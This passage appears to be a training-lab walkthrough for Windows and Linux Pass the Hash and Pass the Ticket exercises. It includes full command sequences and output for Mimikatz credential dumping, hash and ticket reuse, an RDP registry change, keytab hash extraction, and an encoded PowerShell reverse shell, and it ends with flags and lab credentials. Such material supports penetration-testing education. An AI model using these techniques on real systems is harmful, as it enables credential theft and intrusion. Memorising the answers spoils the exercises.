Students can now view the `pth.txt` file to find the flag `G3t_4CCE$$_V1@_PTH` within it:

Code: cmd

```cmd
more C:\pth.txt
```

```
C:\Windows\system32>more C:\pth.txt

G3t_4CCE$$_V1@_PTH
```

Answer: `G3t_4CCE$$_V1@_PTH`

# Pass the Hash (PtH)

## Question 2

### "Try to connect via RDP using the Administrator hash. What is the name of the registry value that must be set to 0 for PTH over RDP to work? Change the registry key value and connect using the hash with RDP. Submit the name of the registry value name as the answer."

Students need to connect to the spawned target and pass the hash with `evil-winrm` using the username `Administrator` and the hash `30B3783CE2ABF1AF70F77D0660CF3453`:

Code: shell

```shell
evil-winrm -i STMIP -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

```
┌─[us-academy-1]─[10.10.14.148]─[htb-ac330204@htb-w12mhmofex]─[~]
└──╼ [★]$ evil-winrm -i 10.129.72.92 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

Then, students need to set the `DisableRestrictedAdmin` registry key:

Code: cmd

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

The operation completed successfully.
```

Students can now pass the hash using RDP for the next question.

Answer: `DisableRestrictedAdmin`

# Pass the Hash (PtH)

## Question 3

### "Connect via RDP and use Mimikatz located in c:\\tools to extract the hashes presented in the current session. What is the NTLM/RC4 hash of David's account?"

Students need to connect to the spawned target with `xfreerdp` utilizing the username `Administrator` and the hash `30B3783CE2ABF1AF70F77D0660CF3453`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.148]─[htb-ac330204@htb-w12mhmofex]─[~]
└──╼ [★]$ xfreerdp /v:10.129.72.92 /u:Administrator /pth:30B3783CE2ABF1AF70F77D0660CF3453 /dynamic-resolution

[19:56:26:607] [9689:9690] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[19:56:26:607] [9689:9690] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr

<SNIP>
```

Subsequently, students need to open Command Prompt as administrator, navigate to `C:\Tools`, and then run `Mimikatz`:

Code: cmd

```cmd
cd C:\Tools
mimikatz.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\tools

C:\tools\>mimikatz.exe

  .####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Students then need to extract the hash of `David` (and `Julio`) using `sekurlsa::logonpasswords`:

Code: cmd

```cmd
privilege::debug
sekurlsa::logonpasswords
```

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

<SNIP>

Authentication Id : 0 ; 347716 (00000000:00054e44)
Session           : Service from 0
User Name         : david
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 10/27/2022 1:41:58 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1107
        msv :
         [00000003] Primary
         * Username : david
         * Domain   : INLANEFREIGHT
         * NTLM     : c39f2beb3d2ec06a62cb887fb391dee0
         * SHA1     : 2277c28035275149d01a8de530cc13b74f59edfb
         * DPAPI    : eaa6db50c1544304014d858928d9694f

Authentication Id : 0 ; 407301 (00000000:00063705)
Session           : Service from 0
User Name         : julio
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 11/22/2022 10:40:58 PM
SID               : S-1-5-21-3325992272-2815718403-617452758-1106
        msv :
         [00000003] Primary
         * Username : julio
         * Domain   : INLANEFREIGHT
         * NTLM     : 64f12cddaa88057e06a81b54e73b949b
         * SHA1     : cba4e545b7ec918129725154b29f055e4cd5aea8
         * DPAPI    : 634db497baef212b777909a4ccaaf700
        tspkg :
        wdigest :
         * Username : julio
         * Domain   : INLANEFREIGHT
         * Password : (null)
        kerberos :
         * Username : julio
         * Domain   : INLANEFREIGHT.HTB
         * Password : (null)
        ssp :
        credman :
```

From the output of `Mimikatz`, students will know that the NTLM hash of the user `David` is `c39f2beb3d2ec06a62cb887fb391dee0`. Moreover, students will also find the NTLM hash `64f12cddaa88057e06a81b54e73b949b` for the user `Julio` , which will be required in subsequent questions.

Answer: `c39f2beb3d2ec06a62cb887fb391dee0`

# Pass the Hash (PtH)

## Question 4

### "Using David's hash, perform a Pass the Hash attack to connect to the shared folder \\\\DC01\\david and read the file david.txt."

From the previously established RDP session, students need to use `Mimikatz` and spawn a new Command Prompt as the user `David`, utilizing `sekurlsa::pth` with the NTLM hash `c39f2beb3d2ec06a62cb887fb391dee0`:

Code: cmd

```cmd
privilege::debug
sekurlsa::pth /user:david /domain:inlanefreight.htb /rc4:c39f2beb3d2ec06a62cb887fb391dee0
```

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:david /domain:inlanefreight.htb /rc4:c39f2beb3d2ec06a62cb887fb391dee0

user    : david
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : c39f2beb3d2ec06a62cb887fb391dee0
  |  PID  1736
  |  TID  4464
  |  LSA Process is now R/W
  |  LUID 0 ; 981959 (00000000:000efbc7)
  \_ msv1_0   - data copy @ 000001F7EAFBC640 : OK !
  \_ kerberos - data copy @ 000001F7EB2C0218
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001F7EB2FA158 (32) -> null
```

A new Command Prompt will spawn, and with it, students will be able to read the `david.txt` file on the shared folder `\\dc01\david\`:

Code: cmd

```cmd
more \\dc01\david\david.txt
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>more \\dc01\david\david.txt

D3V1d_Fl5g_is_Her3
```

Answer: `D3V1d_Fl5g_is_Her3`

# Pass the Hash (PtH)

## Question 5

### "Using Julio's hash, perform a Pass the Hash attack to connect to the shared folder \\\\DC01\\julio and read the file julio.txt."

From the previously established RPD session, students need to use `Mimikatz` to spawn a Command Prompt for the user `Julio`, utilizing the NTLM hash `64f12cddaa88057e06a81b54e73b949b` that was attained previously:

Code: cmd

```cmd
privilege::debug
sekurlsa::pth /user:julio /domain:inlanefreight.htb /rc4:64f12cddaa88057e06a81b54e73b949b
```

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:julio /domain:inlanefreight.htb /rc4:64f12cddaa88057e06a81b54e73b949b

user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64f12cddaa88057e06a81b54e73b949b
  |  PID  4408
  |  TID  4932
  |  LSA Process was already R/W
  |  LUID 0 ; 1167605 (00000000:0011d0f5)
  \_ msv1_0   - data copy @ 000001F7EA93EB10 : OK !
  \_ kerberos - data copy @ 000001F7EB2856F8
   \_ aes256_hmac       -> null
   \_ aes128_hmac       -> null
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 000001F7EB2F84A8 (32) -> null
```

Using the new Command Prompt, students can now read the `julio.txt` file on Julio's shared folder `\\dc01\julio\`:

Code: cmd

```cmd
more \\dc01\julio\julio.txt
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>more \\dc01\julio\julio.txt

JuL1()_SH@re_fl@g
```

Answer: `JuL1()_SH@re_fl@g`

# Pass the Hash (PtH)

## Question 6

### "Using Julio's hash, perform a Pass the Hash attack, launch a PowerShell console and import Invoke-TheHash to create a reverse shell to the machine you are connected via RDP (the target machine, DC01, can only connect to MS01). Use the tool nc.exe located in c:\\tools to listen for the reverse shell. Once connected to the DC01, read the flag in C:\\julio\\flag.txt."

Students need to connect to the spawned target as `Julio` and Pass the Hash with RDP, utilizing the NTLM hash `64f12cddaa88057e06a81b54e73b949b` that was attained previously:

Code: shell

```shell
xfreerdp /v:10.129.247.247 /u:julio /pth:64f12cddaa88057e06a81b54e73b949b /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.148]─[htb-ac330204@htb-w12mhmofex]─[~]
└──╼ [★]$ xfreerdp /v:10.129.247.247 /u:julio /pth:64f12cddaa88057e06a81b54e73b949b /dynamic-resolution

[20:51:23:972] [11130:11131] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[20:51:23:972] [11130:11131] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr

<SNIP>
```

Afterward, students need to open PowerShell, navigate to `C:\Tools\Invoke-TheHash` and then import the module `Invoke-TheHash`:

Code: powershell

```powershell
cd C:\tools\Invoke-TheHash\
Import-Module .\Invoke-TheHash.psd1
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> cd C:\tools\Invoke-TheHash\
PS C:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
```

Then, students need to open Command Prompt, navigate to `C:\Tools\`, and start an `nc` listener:

Code: cmd

```cmd
C:\tools\nc.exe -lvnp PWNPO
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\julio>C:\tools\nc.exe -lvnp 8001

listening on [any] 8001 ...
```

Subsequently, students need to go to www.revshells.com and generate a `Powershell #3 (Base64)` payload:

![[HTB Solutions/CPTS/z. images/89e0b1e0f611aa365721e731fef0d84e_MD5.jpg]]

Students need use this payload along with `Invoke-WMIExec` to pass the Hash as Julio, utilizing the NTLM hash `64f12cddaa88057e06a81b54e73b949b` that was attained previously, therefore triggering a reverse shell:

Code: powershell

```powershell
Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

```
PS C:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb -Username julio -Hash 64f12cddaa88057e06a81b54e73b949b -Command "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAOAAwADAAMQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="

[+] Command executed with process ID 3124 on DC01
```

Checking the `nc` listener, students will notice that the reverse shell connection has been established successfully:

```
C:\Users\julio>C:\tools\nc.exe -lvnp 8001

listening on [any] 8001 ...
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.10] 49774
```

At last, students can now read the flag located at `C:\julio\flag.txt`:

Code: cmd

```cmd
cat C:\julio\flag.txt
```

```
listening on [any] 8001 ...
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.10] 49774

cat C:\julio\flag.txt

JuL1()_N3w_fl@g
```

Answer: `JuL1()_N3w_fl@g`

# Pass the Ticket (PtT) from Windows

## Question 1

### "Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?"

Students first need to connect to the spawned target with `xfreerdp` utilizing the credentials `.\Administrator:AnotherC0mpl3xP4$$`:

Code: shell

```shell
xfreerdp /v:STMIP /u:'.\Administrator' /p:'AnotherC0mpl3xP4$$' /dynamic-resolution
```

```
┌─[us-academy-1]─[10.10.14.148]─[htb-ac330204@htb-jan7ffdbhw]─[~]
└──╼ [★]$ xfreerdp /v:10.129.204.23 /u:'.\Administrator' /p:'AnotherC0mpl3xP4$$' /dynamic-resolution

[18:23:18:748] [9805:9806] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[18:23:18:748] [9805:9806] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[18:23:18:748] [9805:9806] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Then, students need to open Command Prompt as administrator, move to the `C:\tools` directory and run `mimikatz.exe`:

Code: cmd

```cmd
cd C:\tools
mimikatz.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\tools

C:\tools>mimikatz.exe

  .####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Then, students need to elevate their privileges using `privilege::debug` to export tickets using `sekurlsa::tickets` with the `/export` option:

Code: cmd

```cmd
privilege::debug
sekurlsa::tickets /export
```

```
mimikatz # privilege::debug
Privilege '20' OK
mimikatz # sekurlsa::tickets /export

Authentication Id : 0 ; 495075 (00000000:00078de3)
Session           : Service from 0
User Name         : MSSQL$MICROSOFT##WID
Domain            : NT SERVICE
Logon Server      : (null)
Logon Time        : 10/28/2022 12:24:01 PM
SID               : S-1-5-80-1184457765-4068085190-3456807688-2200952327-376953753
<SNIP>
```

Afterward, students can exit `mimikatz` and return to the Command Prompt, running the `dir` command to view contents of `C:\tools`:

Code: cmd

```cmd
dir
```

```
C:\tools>dir

 Volume in drive C has no label.
 Volume Serial Number is B8B3-0D72

 Directory of C:\tools

10/28/2022  12:26 PM    <DIR>          .
10/28/2022  12:26 PM    <DIR>          ..
10/07/2022  09:43 AM         8,230,912 chisel.exe
09/23/2022  01:51 PM    <DIR>          Invoke-TheHash
09/22/2022  01:12 PM         1,355,264 mimikatz.exe
09/22/2022  01:13 PM            45,272 nc.exe
09/22/2022  01:14 PM           440,832 Rubeus.exe
10/28/2022  12:26 PM             1,743 [0;3e4]-0-0-40a50000-MS01$@ldap-
<SNIP>
INLANEFREIGHT.HTB.kirbi
10/28/2022  12:26 PM             1,641 [0;433f4]-2-0-40e10000-julio@krbtgt-INLANEFREIGHT.HTB.kirbi
10/28/2022  12:26 PM             1,623 [0;44187]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
10/28/2022  12:26 PM             1,633 [0;44aa5]-2-0-40e10000-david@krbtgt-INLANEFREIGHT.HTB.kirbi
              18 File(s)     10,095,746 bytes
               3 Dir(s)  18,036,232,192 bytes free
```

Students will observe `3` user tickets, which belong to `Julio`, `John`, and `David`.

Answer: `3`

# Pass the Ticket (PtT) from Windows

## Question 2

### "Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder \\\\DC01.inlanefreight.htb\\john"

Using the previously established RDP session, students need to open Command Prompt as administrator, navigate to `C:\tools`, and run `mimikatz.exe`:

Code: cmd

```cmd
cd C:\tools
mimikatz.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\tools

C:\tools>mimikatz.exe

  .####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Subsequently, students need to pass the ticket for `John`, utilizing the TGT `0;44187]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi` of `Jhon` attained in the previous question:

Code: cmd

```cmd
kerberos::ptt C:\tools\[0;44187]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
```

```
mimikatz # kerberos::ptt C:\tools\[0;44187]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi

* File: 'C:\tools\[0;44187]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
```

Students can now check to confirm that the privileges allow to reach the shared folder:

Code: cmd

```cmd
dir \\DC01.inlanefreight.htb\john
```

```
C:\tools>dir \\DC01.inlanefreight.htb\john
 Volume in drive \\DC01.inlanefreight.htb\john has no label.
 Volume Serial Number is B8B3-0D72

 Directory of \\DC01.inlanefreight.htb\john

07/14/2022  07:25 AM    <DIR>          .
07/14/2022  07:25 AM    <DIR>          ..
07/14/2022  03:54 PM                30 john.txt
               1 File(s)             30 bytes
               2 Dir(s)  18,244,382,720 bytes free
```

At last, students need to read the flag:

Code: cmd

```cmd
more \\DC01.inlanefreight.htb\john\john.txt
```

```
C:\tools>more \\DC01.inlanefreight.htb\john\john.txt

Learn1ng_M0r3_Tr1cks_with_J0hn
```

Answer: `Learn1ng_M0r3_Tr1cks_with_J0hn`

# Pass the Ticket (PtT) from Windows

## Question 3

### "Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\\john\\john.txt"

Students need to open Command Prompt as administrator and move to the `C:\tools` directory, then run `mimikatz`:

Code: cmd

```cmd
cd C:\tools
mimikatz.exe
```

```
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd C:\tools
C:\tools>mimikatz.exe

  .####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .# ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 # / \ #  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 # \ / #       > https://blog.gentilkiwi.com/mimikatz
 '# v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz #
```

Subsequently, students need to pass the ticket for `John`, utilizing the TGT `0;44187]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi` attained previously:

Code: cmd

```cmd
kerberos::ptt C:\tools\[0;44187]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi
```

```
mimikatz # kerberos::ptt C:\tools\[0;44187]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi

* File: 'C:\tools\[0;44187]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi': OK
```

Students then need to move to PowerShell from the same Command Prompt, and enter a Remote PowerShell session on DC01:

Code: cmd

```cmd
powershell
Enter-PSSession -ComputerName DC01
```

```
C:\tools>powershell

Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents>
```

At last, students can read the flag:

Code: cmd

```cmd
cat C:\john\john.txt
```

```
[DC01]: PS C:\Users\john\Documents> cat C:\john\john.txt

P4$$_th3_Tick3T_PSR
```

Answer: `P4$$_th3_Tick3T_PSR`

# Pass the Ticket (PtT) from Linux

## Question 1

### "Connect to the target machine using SSH to the port TCP/2222 and the provided creds. Read the flag in David's home directory."

Students first need to connect to the spawned target machine with SSH utilizing the credentials `david@inlanefreight.htb:Password2`:

Code: shell

```shell
ssh david@inlanefreight.htb@STMIP -p 2222
```

```
┌─[us-academy-1]─[10.10.14.72]─[htb-ac330204@htb-bmdznxzunh]─[~]
└──╼ [★]$ ssh david@inlanefreight.htb@10.129.129.132 -p 2222

The authenticity of host '[10.129.129.132]:2222 ([10.129.129.132]:2222)' can't be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? Yes
Warning: Permanently added '[10.129.129.132]:2222' (ECDSA) to the list of known hosts.
david@inlanefreight.htb@10.129.129.132's password:

david@inlanefreight.htb@linux01:~$ 
```

Then, students can read the flag located at `/home/david@inlanefreight.htb/flag.txt`:

Code: shell

```shell
cat /home/david@inlanefreight.htb/flag.txt 
```

```
david@inlanefreight.htb@linux01:~$ cat /home/david@inlanefreight.htb/flag.txt 

Gett1ng_Acc3$$_to_LINUX01
```

Answer: `Gett1ng_Acc3$$_to_LINUX01`

# Pass the Ticket (PtT) from Linux

## Question 2

### "Which group can connect to LINUX01?"

From the previously established SSH session, students need to run the `realm` command:

Code: shell

```shell
realm list
```

```
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```

Students will find `Linux Admins` as the permitted group.

Answer: `Linux Admins`

# Pass the Ticket (PtT) from Linux

## Question 3

### "Look for a keytab file you have read and write access. Submit the file name as a response."

From the previously established SSH session, students need to look for files containing the word `keytab`:

Code: shell

```shell
find / -name *keytab* -ls 2>/dev/null
```

```
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

   287437      4 -rw-r--r--   1 root     root         2110 Aug  9  2021 /usr/lib/python3/dist-packages/samba/tests/dckeytab.py
   288276      4 -rw-r--r--   1 root     root         1871 Oct  4 16:26 /usr/lib/python3/dist-packages/samba/tests/__pycache__/dckeytab.cpython-38.pyc
   287720     24 -rw-r--r--   1 root     root        22768 Jul 18 12:52 /usr/lib/x86_64-linux-gnu/samba/ldb/update_keytab.so
   286812     28 -rw-r--r--   1 root     root        26856 Jul 18 12:52 /usr/lib/x86_64-linux-gnu/samba/libnet-keytab.so.0
   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262464     12 -rw-r--r--   1 root     root        10015 Oct  4 14:31 /opt/impacket/impacket/krb5/keytab.py
   262184      4 -rw-rw-rw-   1 root     root          216 Oct 31 14:40 /opt/specialfiles/carlos.keytab
   131201      8 -rw-r--r--   1 root     root         4582 Oct  6 12:03 /opt/keytabextract.py
   287958      4 drwx------   2 sssd     sssd         4096 Jun 21 18:29 /var/lib/sss/keytabs
   398204      4 -rw-r--r--   1 root     root          380 Oct  4 14:34 /var/lib/gems/2.7.0/doc/gssapi-1.3.1/ri/GSSAPI/Simple/set_keytab-i.ri
```

Students will notice they have read/write access over `carlos.keytab`.

Answer: `carlos.keytab`

# Pass the Ticket (PtT) from Linux

## Question 4

### "Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's directory as a response."

Using the previously established SSH session, students need to extract the hashes from `carlos.keytab` using `keytabextract`:

Code: shell

```shell
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

```
david@inlanefreight.htb@linux01:~$ python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab 

[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
	REALM : INLANEFREIGHT.HTB
	SERVICE PRINCIPAL : carlos/
	NTLM HASH : a738f92b3c08b424ec2d99589a9cce60
	AES-256 HASH : 42ff0baa586963d9010584eb9590595e8cd47c489e25e82aae69b1de2943007f
	AES-128 HASH : fa74d5abf4061baa1d4ff8485d1261c4
```

Then, students need to browse to https://crackstation.net and decrypt the NTLM hash `a738f92b3c08b424ec2d99589a9cce60`:

![[HTB Solutions/CPTS/z. images/d87352a69d1db0c9b98349ab65defa74_MD5.jpg]]

The hash's cleartext value is `Password5`, thus, students can now SSH to the spawned target machine as `carlos` with the credentials `carlos:Password5`:

Code: shell

```shell
ssh carlos@inlanefreight.htb@STMIP -p 2222
```

```
┌─[us-academy-1]─[10.10.14.72]─[htb-ac330204@htb-bmdznxzunh]─[~]
└──╼ [★]$ ssh carlos@inlanefreight.htb@10.129.129.132 -p 2222

carlos@inlanefreight.htb@10.129.129.132's password: 
